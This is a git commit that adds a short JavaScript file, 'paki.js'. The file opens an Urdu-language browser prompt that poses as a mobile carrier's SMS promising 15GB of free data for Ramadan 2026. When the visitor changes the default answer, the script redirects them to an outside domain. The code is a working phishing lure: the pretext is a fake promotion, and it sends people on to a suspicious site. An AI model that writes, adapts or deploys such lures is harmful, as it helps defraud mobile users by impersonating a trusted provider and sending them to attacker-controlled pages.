9f39f6d0e32ef84e8c42df40760ae030d1023371
usorondo12 <pearls.mentee1a@icloud.com>
2026-02-20 06:31:37 +0100

    Create paki.js

---
+++ paki.js
@@ -0,0 +1,5 @@
+var password = '15GB مفت ڈیٹا'
+password=prompt('رمضان کا دن 2026 مبارک ہو۔ SMS: پیارے قابل قدر کسٹمر، ہم تمام صارفین کو 15GB مفت ڈیٹا دے کر رمضان مناتے ہیں، ابھی چیک کرنے کے لیے فری ڈیٹا دبائیں ','15GB مفت ڈیٹا');
+if (password != '15GB مفت ڈیٹا') {
+location.href='https://www.ntaweyut.site/happyramadandata';
+}
